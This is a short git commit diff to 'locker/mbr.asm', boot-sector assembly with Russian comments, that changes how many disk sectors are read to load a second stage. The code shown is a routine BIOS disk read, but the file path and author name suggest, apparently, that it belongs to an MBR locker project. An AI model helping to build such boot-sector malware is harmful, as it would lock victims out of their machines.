dcf42603d35b061489f138507d32d83f1e612544
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-13 20:52:30 +0300

    mbr.asm

--- locker/mbr.asm
+++ locker/mbr.asm
@@ -11,14 +11,14 @@ start:
     mov sp, 0x7C00
     sti
 
-    ; Загружаем Stage2 из сектора 9 (9 секторов: 9-17)
+    ; Загружаем Stage2 из сектора 9 (10 секторов: 9-18)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x8000
     mov ah, 0x02
-    mov al, 9
+    mov al, 10              ; 10 секторов
     mov ch, 0
-    mov cl, 9
+    mov cl, 9               ; Начиная с сектора 9
     mov dh, 0
     mov dl, 0x80
     int 0x13
